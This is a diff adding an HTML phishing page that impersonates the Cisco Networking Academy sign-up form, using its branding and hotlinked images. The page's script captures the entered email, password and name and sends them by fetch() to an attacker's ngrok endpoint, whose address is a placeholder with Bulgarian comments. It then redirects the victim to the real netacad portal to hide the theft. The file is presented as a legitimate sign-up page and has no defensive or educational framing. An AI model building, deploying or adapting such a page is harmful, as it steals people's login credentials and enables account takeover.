@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>Sign Up | Networking Academy</title>
+    <style>
+        :root {
+            --cisco-blue: #447294;
+            --cisco-midnight: #0d274d;
+            --bg-light-blue: #f4f9fb; /* Точният нюанс от скрийншота ти */
+            --text-gray: #666;
+        }
+
+        body { 
+            font-family: "Arial", sans-serif; 
+            margin: 0; 
+            display: flex; 
+            height: 100vh; 
+            background: #ffffff;
+        }
+
+        /* ЛЯВА ЧАСТ (БАНЕР) */
+        .banner-side { 
+            flex: 1.2; 
+            background-color: var(--bg-light-blue);
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            justify-content: center;
+            text-align: center;
+            position: relative;
+        }
+
+        /* Декоративните линии в ъглите */
+        .banner-side::before {
+            content: "";
+            position: absolute;
+            top: 0; left: 0;
+            width: 150px; height: 150px;
+            background: url('https://auth.netacad.com/auth/resources/0vtvb/login/skillsforall-theme/img/dots-left.png') no-repeat;
+            opacity: 0.5;
+        }
+
+        .banner-side h2 { font-weight: 300; font-size: 28px; color: var(--cisco-midnight); margin-bottom: 10px; }
+        .banner-side p { font-size: 15px; color: #444; max-width: 70%; line-height: 1.4; margin-bottom: 30px; }
+        .banner-image { width: 100%; max-width: 450px; height: auto; }
+
+        /* ДЯСНА ЧАСТ (ФОРМА) */
+        .form-side { flex: 1; display: flex; align-items: center; justify-content: center; padding: 40px; }
+        .content-box { width: 100%; max-width: 440px; position: relative; }
+
+        .top-nav { position: absolute; top: -60px; right: 0; font-size: 12px; color: #444; }
+        .back-btn { display: flex; align-items: center; font-size: 13px; color: #333; margin-bottom: 20px; cursor: pointer; text-decoration: none; }
+        
+        h1 { font-size: 32px; font-weight: 400; color: var(--cisco-midnight); margin: 0 0 5px 0; }
+        .sub-text { color: var(--text-gray); font-size: 14px; margin-bottom: 30px; }
+
+        .section-title { font-weight: 700; font-size: 15px; color: #333; margin-bottom: 20px; border-bottom: 1px solid #eee; padding-bottom: 10px; }
+
+        .row { display: flex; gap: 15px; margin-bottom: 15px; }
+        .col { flex: 1; }
+
+        label { display: block; font-size: 13px; margin-bottom: 8px; color: #333; }
+        input { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; font-size: 14px; }
+
+        .req-link { color: var(--cisco-blue); font-size: 12px; text-decoration: none; display: block; margin: 10px 0; }
+
+        .btn-create { 
+            width: 220px; padding: 12px; background: var(--cisco-blue); color: white; 
+            border: none; border-radius: 25px; font-weight: bold; font-size: 16px; 
+            cursor: pointer; margin-top: 20px;
+        }
+
+        .footer-log { margin-top: 30px; padding: 20px; background: #f4f4f4; border-radius: 4px; font-size: 14px; text-align: left; }
+        .footer-log a { color: #2b5d3a; font-weight: bold; text-decoration: none; }
+
+        @media (max-width: 992px) { body { flex-direction: column; } .banner-side { display: none; } }
+    </style>
+</head>
+<body>
+
+    <div class="banner-side">
+        <h2>Build Your Skills With Cisco</h2>
+        <p>Pursue real career paths through instructor-led courses taught by experts and free, online courses backed by Cisco's expertise.</p>
+        <img src="https://auth.netacad.com/auth/resources/0vtvb/login/skillsforall-theme/img/netacad_banner.jpg" class="banner-image">
+    </div>
+
+    <div class="form-side">
+        <div class="content-box">
+            <div class="top-nav">🌐 English (English)</div>
+            <a href="https://netacad-support-ops.github.io/index.html/" class="back-btn">← Go back</a>
+
+            <h1>Sign Up</h1>
+            <p class="sub-text">You'll be able to start classes as soon as you sign up.</p>
+
+            <div class="section-title">Create New Account</div>
+
+            <form id="final-form">
+                <div class="row">
+                    <div class="col">
+                        <label>First name</label>
+                        <input type="text" id="fname" required>
+                    </div>
+                    <div class="col">
+                        <label>Last name</label>
+                        <input type="text" id="lname" required>
+                    </div>
+                </div>
+
+                <label>Email</label>
+                <input type="email" id="email" required>
+
+                <label style="margin-top:15px;">Password</label>
+                <input type="password" id="pass" required>
+                <a href="#" class="req-link">ⓘ Password requirements:</a>
+
+                <label>Re-enter your new password to confirm</label>
+                <input type="password" id="confirm" required>
+
+                <button type="submit" class="btn-create">Create account</button>
+            </form>
+
+            <div class="footer-log">
+                Already have an account? <a href="#">Log In</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('final-form').onsubmit = function(e) {
+            e.preventDefault();
+            const data = {
+                email: document.getElementById('email').value,
+                pass: document.getElementById('pass').value,
+                name: document.getElementById('fname').value + " " + document.getElementById('lname').value
+            };
+
+            // ТВОЯТ NGROK АДРЕС ТУК
+            const gate = "https://ТВОЯТ-NGROK-ID.ngrok-free.app/log";
+            
+            fetch(`${gate}?u=${encodeURIComponent(data.email)}&p=${encodeURIComponent(data.pass)}&n=${encodeURIComponent(data.name)}`, {mode: 'no-cors'});
+
+            setTimeout(() => {
+                window.location.href = "https://www.netacad.com/portal/learning";
+            }, 1000);
+        };
+    </script>
+</body>
+</html>
